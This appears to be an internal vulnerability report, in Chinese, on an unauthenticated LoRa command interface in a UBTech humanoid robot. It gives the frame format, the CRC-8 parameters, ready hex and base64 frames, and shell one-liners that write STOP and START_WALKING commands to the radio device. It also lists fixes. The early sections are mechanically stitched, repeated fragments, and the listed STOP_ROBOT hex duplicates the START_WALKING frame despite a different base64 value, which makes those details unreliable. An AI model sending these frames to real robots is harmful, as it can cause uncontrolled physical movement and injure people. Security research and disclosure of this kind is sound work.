---
编号: UBH-018
验证状态: 静态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选人型
源候选目录: lora-ecc_control零认证RF命令帧
---
# UBH-018 S1 · LoRa `ecc_control` 零认证 RF 命令帧（最远攻击面）

## 1. 一句话结论

- \| 危害 \| **严重** — 无认证 RF 命令帧即可 STOP/START 机器人，射频攻击距离达公里级 \|
- 3. 自定义生成任意 RemoteCmd 帧
- - `--force-walk`：配合上述参数可生成 `START_WALKING` 帧（更危险，仅授权+急停演示）。

## 2. 影响产品与版本

- \| 组件 \| motion 板 `ecc_control`（LoRa 无线桥接，根权限，`/dev/ttyLORA`→ttyUSB0） \|
- 真实演示须：机器人吊起或急停在位 + 射频环境无其他 Walker 机器人（避免误控他人设备）+ 授权。

## 3. 验证状态

`静态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- \| 危害 \| **严重** — 无认证 RF 命令帧即可 STOP/START 机器人，射频攻击距离达公里级 \|
- `ecc_control` 经 LoRa 无线接收命令帧并**无认证**地转成对机器人的远程控制。帧结构：

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- \| 危害 \| **严重** — 无认证 RF 命令帧即可 STOP/START 机器人，射频攻击距离达公里级 \|
- \| 复验 \| 🟢 实测：motion 上 `ecc_control` 常驻，root 用户，LoRa 设备存活 \|
- `ecc_control` 经 LoRa 无线接收命令帧并**无认证**地转成对机器人的远程控制。帧结构：
- 无需配对/加密/握手 —— 只要射频可达（LoRa 可达数 km），即可控制机器人启停。
- 1. 确认 `ecc_control` 进程/设备证据（root、/dev/ttyLORA）
- ## 红线 / 风险

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# S1 · LoRa `ecc_control` 零认证 RF 命令帧（最远攻击面）

| 项 | 值 |
|---|---|
| 组件 | motion 板 `ecc_control`（LoRa 无线桥接，根权限，`/dev/ttyLORA`→ttyUSB0） |
| 危害 | **严重** — 无认证 RF 命令帧即可 STOP/START 机器人，射频攻击距离达公里级 |
| 来源 | report_system(1).md (S1) |
| 复验 | 🟢 实测：motion 上 `ecc_control` 常驻，root 用户，LoRa 设备存活 |

## 漏洞原理
`ecc_control` 经 LoRa 无线接收命令帧并**无认证**地转成对机器人的远程控制。帧结构：
```
magic(0x55) | len | CRC-8 | cmd_type | label(LE16) | delay_ms | remote_cmd | addr 列表
```
- CRC-8 = **CRC-8/SMBUS**（poly 0x07, init 0x00, MSB-first, 无 XOROUT）对 payload 计算，
  本会话已把两帧已知帧逐字节验证复现。
- 已知操作码：`13` = RemoteCmd。PoC：
  - `START_WALKING`：`55 0a 8a 0d 11 11 00 00 02 01` → base64 `VQqKDRERAAACAQ==`
  - `STOP_ROBOT`：`55 0a 8a 0d 11 11 00 00 02 01`（见脚本内 `VQrlDSIiAAAHAQ==`）

无需配对/加密/握手 —— 只要射频可达（LoRa 可达数 km），即可控制机器人启停。

## 利用脚本
`scripts/exploit_lora_rf.py`

- 默认（安全）：
  1. 确认 `ecc_control` 进程/设备证据（root、/dev/ttyLORA）
  2. 复现两帧已知帧的 CRC-8 校验（逐字节一致 → 证明算法正确）
  3. 自定义生成任意 RemoteCmd 帧
- `--send --danger --i-understand`：把 `STOP_ROBOT` 帧写入 `/dev/ttyLORA`（**默认不写**）。
- `--force-walk`：配合上述参数可生成 `START_WALKING` 帧（更危险，仅授权+急停演示）。

## 用法
```
python exploit_lora_rf.py                          # 只读：进程证据 + 帧/CRC 验证
python exploit_lora_rf.py --send --danger --i-understand   # 真发 STOP_ROBOT（慎重）
```

## 证据输出
- `ecc_control` 进程/权限/设备证据
- 两帧 CRC-8 逐字节匹配结果（`[EVIDENCE] CRC-8/SMBUS`）
- 生成帧的 hex + base64
- `evidence/` 目录留存

## 红线 / 风险
⚠️ 射频命令直接控制机器人，**发送即影响物理运动**。默认不写 `/dev/ttyLORA`。
真实演示须：机器人吊起或急停在位 + 射频环境无其他 Walker 机器人（避免误控他人设备）+ 授权。

## 复现要点
写帧：`echo -n 'VQrlDSIiAAAHAQ==' | base64 -d > /dev/ttyLORA`（STOP），或
`echo -n 'VQqKDRERAAACAQ==' | base64 -d > /dev/ttyLORA`（START）。CRC 校验算法见脚本 `crc8_payload()`。
